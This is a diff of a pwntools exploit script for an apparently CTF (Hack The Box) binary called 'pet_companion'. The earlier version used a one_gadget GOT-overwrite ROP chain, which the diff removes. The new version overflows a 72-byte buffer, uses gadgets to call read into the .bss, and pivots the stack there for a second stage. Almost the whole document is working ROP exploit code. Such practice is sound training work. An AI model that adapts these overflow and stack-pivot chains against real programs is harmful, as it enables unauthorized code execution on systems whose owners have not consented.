@@ -15,7 +15,7 @@ context.log_level = 'debug'
 
 offset = 72
 
-elf = ELF('./pet_companion')
+binary = ELF('./pet_companion')
 libc = ELF('./glibc/libc.so.6')
 
 padding = offset*b'A'
@@ -23,8 +23,8 @@ padding = offset*b'A'
 #ip, port='161.35.168.118', 30070
 #ip, port = '83.136.250.41', 46944   #HTB
 #io = remote(ip,port)
-io = process('./pet_companion')
-#io = gdb.debug('./pet_companion','break main')
+#io = process('./pet_companion')
+io = gdb.debug('./pet_companion','break main')
 
 #0x0000000000401108 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
 #0x00000000004005e8 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
@@ -66,28 +66,35 @@ constraints:
 
 '''
 
-one_gadget = 0x4f2a5
+#one_gadget = 0x4f2a5
 #one_gadget = 0x4f302
 #one_gadget = 0x10a2fc
 
-offset = one_gadget - libc.sym['read']
+new_stack = (binary.bss() & 0xfff000) + 0xf00
+pop_rdi = binary.search(asm('pop rdi; ret')).__next__()
+pop_rsi_r15 = binary.search(asm('pop rsi ; pop r15 ; ret')).__next__()
+pop_rsp_r13_r14_r15 = binary.search(asm('pop rsp; pop r13; pop r14; pop r15; ret')).__next__()
 
-offset = 2**32 + offset
-print(hex(offset))
-
-read_got = elf.got['read']  #libc_base + libc.sym['read']
-read_plt = elf.sym['read']
-print(hex(read_got))
-print(hex(read_plt))
-
-rop_chain = p64(0x00000000004004de) + p64(0x0040073a) + p64(offset) + p64(read_got+0x3d) + p64(0)*4
-rop_chain += p64(0x004005e8)
-rop_chain += p64(read_plt)
-#rop_chain += p64(read_got)  #error
-
-payload = padding + rop_chain
+payload  = b''
+payload += offset * b'A'
+payload += p64(pop_rdi)
+payload += p64(0)
+payload += p64(pop_rsi_r15)
+payload += p64(new_stack)
+payload += p64(0)
+payload += p64(binary.plt.read)
+payload += p64(pop_rsp_r13_r14_r15)
+payload += p64(new_stack)
 
 io.recvuntil('current status:')
 io.sendline(payload)
-io.interactive()
+
+payload  = b''
+payload += p64(0)
+payload += p64(0)
+payload += p64(0)
+payload += p64(binary.sym._start)
+
+io.recvuntil('current status:')
+io.sendline(payload)
 
